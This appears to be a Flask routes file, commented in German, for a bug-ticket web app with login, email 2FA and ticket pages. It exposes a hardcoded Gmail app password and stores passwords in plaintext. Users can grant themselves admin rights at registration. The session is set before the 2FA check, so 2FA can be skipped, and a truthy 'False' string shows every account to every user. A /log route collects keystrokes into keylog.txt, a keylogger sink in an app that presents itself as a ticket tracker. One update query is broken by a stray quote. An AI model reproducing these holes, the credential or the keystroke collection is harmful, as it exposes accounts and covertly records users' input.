from ticket import app, db # Einbinden von Variable db und app aus __init__.py
from flask import render_template, request, redirect, url_for, jsonify, session, send_file # import von Methoden aus Flask
from sqlalchemy import text # Import von Methode text() von sqlalchemy
import datetime
from collections import defaultdict
import time
import pyotp
import io
import qrcode
import base64
import smtplib
import random
from email.mime.text import MIMEText

def send_email_code(receiver_email, code):
    sender_email = "m.beiterhhh@gmail.com"
    sender_password = "ubkp lell xvbh nnqd"  # Achtung: am besten aus .env laden

    msg = MIMEText(f"Dein Login-Code lautet: {code}")
    msg['Subject'] = "Dein 2FA-Code"
    msg['From'] = sender_email
    msg['To'] = receiver_email

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, sender_password)
        server.send_message(msg)

# Globale Variable zum Speichern von fehlgeschlagenen Logins (Brute Force Schutz)
failed_logins = defaultdict(list)       # Schema: {ip:[timestamp1, timestamp2, timestamp3, ...], ip2: [...]}
MAX_ATTEMPTS = 5
LOCKOUT_SECONDS = 300  # 5 Minuten

@app.route("/")
def home_page():
    return render_template("home.html")

@app.route("/tickets")
def tickets_page():
    # Überprüfen ob Session vorhanden (also eingeloggt):
    if not session.get("username"):
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    query_stmt = text("select * from bugitems")          # parametrisierte query Statement --> sicher gegen SQL-Injection
    result = db.session.execute(query_stmt)   # Ergebnis der Abfrage aus DB in result speichern
    items = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
    #items = result.mappings().all()
    #z.b. [(1, "Anmeldung fehlschlägt", "Offen", "2024-12-01"), (2, "Seite lädt langsam", "In Bearbeitung", "2024-12-05"), ...]

    print(items)
    return render_template("tickets.html", items=items)  # tickets.html wird geladen und es stellt Variable items und name zur Verfügung in tickets.html zum Einbinden


@app.route("/register", methods=["GET", "POST"])
def register_page():
    if request.method == "POST":
    # Wenn POST Request d.h. Formulardaten abgeschickt werden --> soll hier die daten verarbeitet werden und in DB gespeichert werden!!
        print("post")
        # Formulardaten speichern
        username = request.form.get("username")
        email = request.form.get("email")
        password1 = request.form.get("password1")
        password2 = request.form.get("password2")
        isAdmin = int(bool(request.form.get("is_admin")))
        print(username, email, password1, password2, isAdmin)

        # wenn passwort nicht übereinstimmt
        if password1 != password2:
            failure = " Passwords doesn't match"
            return render_template("register.html", failure=failure)

        # Wenn Passwörter übereinstimmen --> Registrierung erfolgreich und Formulardaten in DB speichern
        if password1 == password2:           
            queryStmt = text("Insert into bugusers(username, email_address, password, is_admin) values(:username, :email, :password, :is_admin)")     
            result = db.session.execute(queryStmt, {
                "username": username,
                "email": email,
                "password": password1,
                "is_admin": isAdmin
            })
            db.session.commit()
            print(result)

            #session['username'] = username
            #session['isAdmin'] = bool(isAdmin)

            success = f"Registrierung erfolgreich. Melden Sie sich bitte erneut an. Sie müssen bei jedem Login mit ihrer E-Mail bestätigen!"
            return redirect(f"/login?success={success}")
    
    if request.method == "GET":
    ## Anzeigen der register-Page und nichts weiter
        return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        print("post")

        username = request.form.get("username")         # strip()--> entfernt Leerzeichen (oder Whitespace-Zeichen wie \n, \t) am Anfang und Ende eines Strings
        password = request.form.get("password")         # verhindert ein paar SQL injections, deshalb weglassen

        print(username, password)

        now = time.time()
        # Brute Force Schutz
        # Schritt 1: Prüfen ob Benutzer/IP gesperrt
        attempts = failed_logins[username]
        # Veraltete Einträge löschen
        attempts = [ts for ts in attempts if now -ts < LOCKOUT_SECONDS]
        failed_logins[username] = attempts

        if len(attempts) >= MAX_ATTEMPTS:
            wait_time = int(LOCKOUT_SECONDS - (now - attempts[-1]))
            msg = f"Too many failed attempts. Please wait {wait_time} seconds and try again."
            return render_template("login.html", msg=msg) 

        # Schritt 2: Login-Versuch prüfen
        query_stmt = text("select username, is_admin, email_address from bugusers where username = :username and password = :password")
        print(query_stmt)
        result = db.session.execute(query_stmt, {"username": username, "password": password})
        buguser = result.fetchone()
        print(buguser)

        if not buguser:
            # Schritt 3: Fehlversuch speichern
            failed_logins[username].append(now)
            print("kein user und passwort in db dazu")
            msg = "no user with this credentials found. False Username or Passwor. Try again"
            return render_template("login.html", msg=msg)
        else:
            # Schritt 4: Bei Erfolg Einträge löschen
            failed_logins.pop(username, None)
            
            print("hat geklappt")
            # Session mit Username aus login-feld: username
            session['username'] = username

            isAdmin = "True" if buguser.is_admin else "False"
            # session mit kennzeichnung dass admin ist
            session['isAdmin'] = isAdmin

            if buguser:
                email = buguser.email_address
                code = str(random.randint(100000, 999999))
                session["pending_2fa_user"] = username
                session["2fa_code"] = code
                session["2fa_email"] = email
            
                send_email_code(email, code)

                return redirect("/verify-email-2fa")
            else:
                return "Login fehlgeschlagen", 401           
       
    return render_template("login.html")


@app.route("/moreInfo", methods=["GET", "POST"])
def moreInfo_page():
    ticketId = request.args.get("ticketId")
    
    if request.method == "GET":
        #Datenbank Infos von Datenbank abholen und in html anzeigen
        print("get")
        queryStmnt = text("select * from bugitems where id= :ticketId")
        result = db.session.execute(queryStmnt, {"ticketId": ticketId})
        ticketItem = result.fetchone()
        print(ticketItem)
        return render_template("moreInfo.html", ticketItem=ticketItem)
    
    if request.method == "POST":
        print("post")
        # Geänderte TicketItem Werte in Form mit alter table in bugitems übernehmen
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")
        print(priority, username, title, description)

        queryStmnt = text("""
            "update bugitems set
            priority= :priority,
            username= :username,
            title= :title,
            description= :description
            where id= :ticketId
        """)

        db.session.execute(queryStmnt, {
            "priority": priority,
            "username": username,
            "title": title,
            "description": description,
            "ticketId": ticketId
        })

        db.session.commit()
        return redirect("/tickets")


@app.route("/logout")
def logout_page():
    # Session mit Username und Session mit isAdmin Kennzeichnung wird gelöscht
    session.pop('username', None)
    session.pop('isAdmin', None)
    session.pop("2fa_verified", None)
    return redirect(url_for('home_page'))


@app.route("/newTicket", methods=["GET", "POST"])
def newTicket_page():
    print("jetzt in ticket_page-function")
    name = session.get("username")
    print(name)

    # Wenn nicht angemeldet, dann Weiterleiten an login_page und fertig hier 
    # --> muss nicht zwingend angemeldet sein, da auch GET-Request auf /newTicket gemacht werden kann ohne eigeloogt zu sein( nur über Adressleiste, da Button habe ich entfernt bei Nicht-Eingeloggtem User)
    if not name:
        print("nicht angemeldet")
        return redirect(url_for("login_page"))  # wichtig: return nicht vergessen, sonst durchläuft programm weiterhin funktion, was man nicht will
    
    ## alles was folgt wird nur noch ausgeführt wenn angemeldet
    # wenn post request gesendet wird, dass heißt formular abgeschickt wird
    if request.method == "POST":
        print("post")

        # Formulardaten abspeichern
        priority = request.form.get("priority")
        username = request.form.get("username")
        title = request.form.get("title")
        description = request.form.get("description")

        print(priority, username, title, description)

        # in Datenbank schreiben
        stmt = text("INSERT INTO bugitems(priority, username, title, description) VALUES (:priority, :username, :title, :description)")
        db.session.execute(stmt, {
            "priority": priority,
            "username": username,
            "title": title,
            "description": description
        })

        #print(result)
        # Speichern der DAten in DB
        db.session.commit()

        # anhängen Session mit angemeldetem Username 
        session['username'] = name
         # weiterleiten zu Ticketübersicht-Page
        return redirect(url_for('tickets_page'))
    
    if request.method == "GET":
        return render_template("newTicket.html")
    
    #return render_template("newTicket.html") --> kann auch so gemacht werden, da der einzige Fall wo der Code noch hierunterkommt ist wenn es ein GET-Request ist !!


@app.route("/account")
def account_page():
    print("jetzt in account page")

    loggedName = session.get("username")
    isAdmin = session.get("isAdmin")
    print(loggedName, isAdmin)

    # Überprüfen ob ein session gesetzt/gespeichert ist
    if not loggedName:
        # Wenn nicht dann weiterleiten zu login_page zum Anmelden
        return redirect(url_for("login_page"))
    
    # Wenn ja, also bereits angemeldet
    if loggedName:
        # wenn User ein Admin ist ( muss als String verglichen werden, da request.cookies.get("isAdmin") der Wert davon wird als String gespeichert !!!!)
        if isAdmin:
            query_stmt = text("select * from bugusers;")        # select-Operation für Abfrage aller User Konten, weil Admin
            result = db.session.execute(query_stmt)

        # wenn User kein Admin ist
        elif not isAdmin:
            query_stmt = text("select * from bugusers where username = :username")
            result = db.session.execute(query_stmt, {"username": loggedName})   # Ergebnis der Abfrage aus DB in result speichern

        else:
            # Fallback: wenn isAdmin-Wert fehlerhaft ist
            return "Fehler: Unbekannter Admin-Status", 400

        users = result.fetchall()                       # konvertiert ergebnis in Liste mit Tupeln 
        print(users)

        return render_template("account.html", users=users, loggedName=loggedName)  # account.html wird geladen und es stellt Variable users und name zur Verfügung in account.html zum Einbinden
    

@app.route("/faq", methods=["GET", "POST"])
def faq_page():
    print("jetzt in faq-Page.")
    print('test')
    confirm = None

    if request.method == "POST":
        question = request.form.get("question")
        print(question)
        if question:
            confirm = f"Deine Frage: '{question}' wurde übermitellt und wird so schnell wie möglich beantwortet."

    return render_template("faq.html", confirm=confirm)


@app.route("/log", methods=["POST"])
def log_key():
    print(">>> log_key wurde aufgerufen")  # Debug
    data = request.get_json()
    print(">>> empfangene Daten:", data)   # Debug
    key = data.get('key')
    with open('keylog.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")
    return jsonify({"status":"logged"}), 200


@app.route("/verify-email-2fa", methods=["GET", "POST"])
def verify_email_2fa():
    if request.method == "POST":
        input_code = request.form.get("code")
        real_code = session.get("2fa_code")
        username = session.get("pending_2fa_user")

        if input_code == real_code:
            # Erfolgreich -> session setzen
            user = db.session.execute(
                text("SELECT * FROM bugusers WHERE username = :u"),
                {"u": username}
            ).fetchone()
            session["username"] = username
            session["isAdmin"] = user.is_admin

            # Aufräumen
            session.pop("2fa_code", None)
            session.pop("pending_2fa_user", None)
            session.pop("2fa_email", None)

            return redirect("/account")
        else:
            return "Falscher Code", 400

    return render_template("verify_2fa_email.html")
